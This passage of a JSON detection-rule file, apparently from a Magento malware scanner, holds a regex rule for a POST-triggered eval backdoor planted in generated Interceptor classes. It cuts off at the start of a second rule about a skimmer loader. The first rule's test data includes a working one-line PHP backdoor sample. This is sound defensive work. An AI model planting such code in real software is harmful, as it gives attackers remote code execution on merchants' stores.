        {
            "id": "interceptor-init-post-eval",
            "name": "Backdoor injected into a generated Magento Interceptor class",
            "severity": "critical",
            "source": "https://sansec.io/research/magento-xml-backdoor",
            "target": [
                "generated_php"
            ],
            "pattern_type": "regex",
            "pattern": "/___init\\(\\);\\s*if\\s*\\(\\s*isset\\s*\\(\\s*\\$_POST\\s*\\[\\s*['\"][0-9a-f]{10}['\"]\\s*\\]\\s*\\)\\s*\\)\\s*\\{[\\s\\S]{0,300}?eval/",
            "description": "Persistence backdoor added to a generated Interceptor class by a sed command, so it survives cache rebuilds. Lives under generated/code/, which no other target covers. Source: https://sansec.io/research/magento-xml-backdoor",
            "test_should_match": [
                "___init();\n if (isset($_POST[\"7faa27b473\"])) { @eval($c(strrev($_POST[\"7faa27b473\"]))); exit(0); }"
            ],
            "test_should_not_match": [
                "___init();\n return parent::execute();"
            ]
        },
        {
            "id": "magecart-atob-regexp-page-gate",
            "name": "Skimmer loader gated by a base64-decoded URL regex",
